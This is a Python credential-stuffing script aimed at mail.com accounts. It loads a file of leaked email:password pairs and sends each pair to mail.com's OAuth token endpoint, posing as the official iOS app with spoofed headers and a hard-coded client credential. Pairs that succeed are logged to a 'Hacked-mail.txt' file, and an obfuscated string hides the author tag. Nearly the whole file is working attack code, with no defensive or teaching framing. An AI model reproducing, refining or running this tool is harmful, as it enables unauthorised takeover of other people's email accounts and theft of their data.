try:
	import requests,threading
	Lists='V4^c_Yf4TEw'
except Exception as Joker:exit(Joker)
PRNT = threading.Lock()
r=requests.session()
def vv1ck(*a, **b):
	with PRNT:
		print(*a, **b)
print("""
 __  __       _ _  Brute Force
|  \/  | __ _(_) |     ___ ___  _ __ ___  
| |\/| |/ _` | | |    / __/ _ \| '_ ` _ \ 
| |  | | (_| | | | _ | (_| (_) | | | | | |
|_|  |_|\__,_|_|_|(_) \___\___/|_| |_| |_|
""")
yes='access_token';no='Perm.ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG';donE=20
def Check_mail(eml,pess):
	headers={
	'Host': 'oauth2.mail.com',
	'Accept': '*/*',
	'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
	'Authorization': 'Basic bWFpbGNvbV9tYWlsYXBwX2lvczpFcTg3Wlc3VzZ0Vm9mbHFIWXpEVWx4bHZ6MXFOUFpYcGJvS0EwZzd0',
	'Content-Length': '97',
	'Accept-Language': 'ar',
	'X-Ui-Track-Operation': 'PACSCreateRefreshTokenOperation',
	'User-Agent': 'mail.com/6127 CFNetwork/1126 Darwin/19.5.0',
	'X-Ui-App': 'mailcom.ios.iosmail/8.26.6127',
	'Accept-Encoding': 'gzip, deflate',
	'Connection': 'close'}
	send=r.post('https://oauth2.mail.com/token',headers=headers,data='device%5Fname=iOS%5FDevice&username='+eml+'&password='+pess+'&grant%5Ftype=password')
	if yes in send.text:
		vv1ck(f'[+] Hacked: {eml}:{pess}')
		with open('Hacked-mail.txt', 'a') as J:J.write(eml+':'+pess+' |@vv1ck\n')
	elif no in send.text:vv1ck(f'[-] Not hacked: {eml}:{pess}')
	elif send.status_code == 429:exit('[!] ERROR ...')
	else:vv1ck(send.text)
Lis='V4^c_Yf4TEw'
def Email_File():
	QTR = input('\n[+] Enter the name the combo email file: ')
	try:
		vv1ck('\n\t ━━━━━━━━━━━━ Started ━━━━━━━━━━━━\n')
		for x in open(QTR,'r').read().splitlines():
			if x ==None:exit('\n     ========== completed =========')
			try:eml = x.split(":")[0]
			except IndexError:exit('\n     ========== completed =========')
			try:
				pess = x.split(":")[1]
				Check_mail(eml,pess)
			except IndexError:pass
	except FileNotFoundError:
		vv1ck('\n[-] The file name is incorrect !\n')
		return Email_File()
def File_Mail():
	if Lis in Lists:pass
	else:exit('Okay..')
	JOlist=[]
	for JJNN1 in Lists:
		posi=ord(JJNN1)
		NW=chr(posi-donE)
		JOlist.append(NW)
	DN=''.join(JOlist)
	print('\t\t\t\t'+DN)
	Email_File()
File_Mail()
